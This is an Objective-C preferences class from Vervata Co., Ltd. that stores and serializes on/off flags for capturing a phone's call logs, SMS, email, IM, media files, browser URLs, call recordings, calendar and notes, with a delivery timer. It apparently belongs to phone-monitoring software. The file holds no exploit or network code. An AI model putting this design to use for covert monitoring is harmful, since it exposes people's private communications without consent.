/** 
 - Project name: Preferences
 - Class name: PrefEventsCapture
 - Version: 1.0
 - Purpose: Preference about captur
 - Copy right: 28/11/11, Benjawan Tanarattanakorn, Vervata Co., Ltd. All right reserved.
 */

#import "PrefEventsCapture.h"
#import "AESCryptor.h"

@interface PrefEventsCapture (private)
- (void) transferDataToVariables: (NSData *) aData;
@end

@implementation PrefEventsCapture

@synthesize mStartCapture;
@synthesize mEnableCallLog;
@synthesize mEnableSMS;
@synthesize mEnableEmail;
@synthesize mEnableMMS;
@synthesize mEnableIM;
@synthesize mEnablePinMessage;
@synthesize mEnableWallPaper;
@synthesize mEnableCameraImage;
@synthesize mEnableAudioFile;
@synthesize mEnableVideoFile;
@synthesize mEnableBrowserUrl;
@synthesize mEnableALC;
@synthesize mEnableCallRecording;
@synthesize mEnableCalendar;
@synthesize mEnableNote;
@synthesize mSearchMediaFilesFlags;
@synthesize mMaxEvent;
@synthesize mDeliverTimer;

- (id) init {
	self = [super init];
	if (self != nil) {
		[self setMMaxEvent:10];
	}
	return self;
}

- (id) initFromData: (NSData *) aData {
	self = [super init];
	if (self != nil) {
		[self transferDataToVariables:aData];
	}
	return self;
}

- (id) initFromFile: (NSString *) aFilePath
{
	self = [super init];
	if (self != nil) {
		NSData *data = [NSData dataWithContentsOfFile:aFilePath];
		[self transferDataToVariables:data];
	}
	return self;
}

- (NSData *) toData {
	NSMutableData* data = [[NSMutableData alloc] init];
	
	[data appendBytes:&mMaxEvent length:sizeof(NSInteger)];
	[data appendBytes:&mDeliverTimer length:sizeof(NSInteger)];
	[data appendBytes:&mStartCapture length:sizeof(BOOL)];
	[data appendBytes:&mEnableCallLog length:sizeof(BOOL)];
	[data appendBytes:&mEnableSMS length:sizeof(BOOL)];
	[data appendBytes:&mEnableEmail length:sizeof(BOOL)];
	[data appendBytes:&mEnableMMS length:sizeof(BOOL)];
	[data appendBytes:&mEnableIM length:sizeof(BOOL)];
	[data appendBytes:&mEnablePinMessage length:sizeof(BOOL)];
	[data appendBytes:&mEnableWallPaper length:sizeof(BOOL)];
	[data appendBytes:&mEnableCameraImage length:sizeof(BOOL)];
	[data appendBytes:&mEnableAudioFile length:sizeof(BOOL)];
	[data appendBytes:&mEnableVideoFile length:sizeof(BOOL)];
	[data appendBytes:&mSearchMediaFilesFlags length:sizeof(NSUInteger)];
	[data appendBytes:&mEnableBrowserUrl length:sizeof(BOOL)];
	[data appendBytes:&mEnableALC length:sizeof(BOOL)];
	[data appendBytes:&mEnableCallRecording length:sizeof(BOOL)];
	[data appendBytes:&mEnableCalendar length:sizeof(BOOL)];
	[data appendBytes:&mEnableNote length:sizeof(BOOL)];
	[data autorelease];
	return data;
}

- (void) transferDataToVariables: (NSData *) aData {
	NSInteger location;
	
	[aData getBytes:&mMaxEvent length:sizeof(NSInteger)];
	location = sizeof(NSInteger);
	
	NSRange range = NSMakeRange(location, sizeof(NSInteger));
	[aData getBytes:&mDeliverTimer range:range];
	location += sizeof(NSInteger);
	
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mStartCapture range:range];
	location += sizeof(BOOL);
	
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableCallLog range:range];
	location += sizeof(BOOL);
	
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableSMS range:range];
	location += sizeof(BOOL);
	
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableEmail range:range];
	location += sizeof(BOOL);
	
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableMMS range:range];
	location += sizeof(BOOL);
	
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableIM range:range];
	location += sizeof(BOOL);
	
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnablePinMessage range:range];
	location += sizeof(BOOL);
	
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableWallPaper range:range];
	location += sizeof(BOOL);
	
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableCameraImage range:range];
	location += sizeof(BOOL);
	
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableAudioFile range:range];
	location += sizeof(BOOL);
	
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableVideoFile range:range];
	location += sizeof(BOOL);
	
	range = NSMakeRange(location, sizeof(NSUInteger));
	[aData getBytes:&mSearchMediaFilesFlags range:range];
	location += sizeof(NSUInteger);
	
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableBrowserUrl range:range];
	location += sizeof(BOOL);

	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableALC range:range];
	location += sizeof(BOOL);
	
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableCallRecording range:range];
	location += sizeof(BOOL);
	
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableCalendar range:range];
	location += sizeof(BOOL);
	
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableNote range:range];
}

- (PreferenceType) type {
	return kEvents_Ctrl;
}

- (void) reset {
	[self setMStartCapture:NO];
	[self setMEnableCallLog:NO];
	[self setMEnableSMS:NO];
	[self setMEnableEmail:NO];
	[self setMEnableMMS:NO];
	[self setMEnableIM:NO];
	[self setMEnablePinMessage:NO];
	[self setMEnableWallPaper:NO];
	[self setMEnableCameraImage:NO];
	[self setMEnableAudioFile:NO];
	[self setMEnableVideoFile:NO];
	[self setMEnableBrowserUrl:NO];
	[self setMEnableALC:NO];
	[self setMEnableCallRecording:NO];
	[self setMEnableCalendar:NO];
	[self setMEnableNote:NO];
	[self setMSearchMediaFilesFlags:0x00];
	[self setMMaxEvent:10];
	[self setMDeliverTimer:1];
}

- (void) dealloc {
	[super dealloc];
}

@end
